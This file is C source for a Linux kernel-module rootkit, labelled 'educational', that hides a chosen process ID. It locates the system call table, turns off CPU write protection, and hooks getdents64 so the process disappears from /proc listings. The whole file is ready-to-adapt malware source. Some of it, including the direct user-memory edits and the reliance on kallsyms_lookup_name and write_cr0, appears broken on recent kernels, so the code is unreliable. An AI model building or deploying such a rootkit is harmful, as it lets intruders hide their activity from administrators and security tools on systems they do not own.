#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational Purpose");
MODULE_DESCRIPTION("Basic Educational Rootkit to Hide a Process");

unsigned long **sys_call_table;

/* Define the PID of the process we want to hide */
#define HIDE_PID 1234  // Change to the process you want to hide

/* Pointer to the original sys_getdents64 system call */
asmlinkage long (*original_sys_getdents64)(const struct pt_regs *);

/* Directory entry structure */
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

/* Custom getdents64 hook function */
asmlinkage long hook_sys_getdents64(const struct pt_regs *regs) {
    int ret;
    struct linux_dirent64 *dirp, *cur, *prev = NULL;
    unsigned long offset = 0;
    
    ret = original_sys_getdents64(regs);  // Call the original getdents64 system call

    if (ret <= 0) {
        return ret;  // If no directory entries, return original result
    }

    dirp = (struct linux_dirent64 *)regs->si;  // Get the directory entries from user space

    /* Iterate over the directory entries */
    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)dirp + offset);

        /* Check if the current entry is the process we want to hide (e.g., in /proc/ directory) */
        if (simple_strtol(cur->d_name, NULL, 10) == HIDE_PID) {
            if (prev) {
                prev->d_reclen += cur->d_reclen;  // Skip over the hidden process
            } else {
                ret -= cur->d_reclen;  // Adjust the return size
                memmove(cur, (char *)cur + cur->d_reclen, ret - offset);
                continue;
            }
        }

        prev = cur;
        offset += cur->d_reclen;
    }

    return ret;  // Return modified directory entries
}

/* Disable write protection on the system call table */
static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);  // Clear the WP (Write Protect) bit
    write_cr0(cr0);
}

/* Enable write protection on the system call table */
static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);  // Set the WP (Write Protect) bit
    write_cr0(cr0);
}

/* Find the system call table */
unsigned long **find_sys_call_table(void) {
    unsigned long **sctable;

    sctable = (unsigned long **)kallsyms_lookup_name("sys_call_table");

    return sctable;
}

/* Module initialization function */
static int __init rootkit_init(void) {
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "Failed to find system call table\n");
        return -1;
    }

    /* Save the original getdents64 call */
    original_sys_getdents64 = (void *)sys_call_table[__NR_getdents64];

    /* Disable write protection */
    disable_write_protection();

    /* Replace getdents64 with our hook */
    sys_call_table[__NR_getdents64] = (unsigned long *)hook_sys_getdents64;

    /* Re-enable write protection */
    enable_write_protection();

    printk(KERN_INFO "Rootkit loaded: process hiding enabled\n");

    return 0;
}

/* Module cleanup function */
static void __exit rootkit_exit(void) {
    /* Disable write protection */
    disable_write_protection();

    /* Restore the original getdents64 */
    sys_call_table[__NR_getdents64] = (unsigned long *)original_sys_getdents64;

    /* Re-enable write protection */
    enable_write_protection();

    printk(KERN_INFO "Rootkit unloaded: process hiding disabled\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
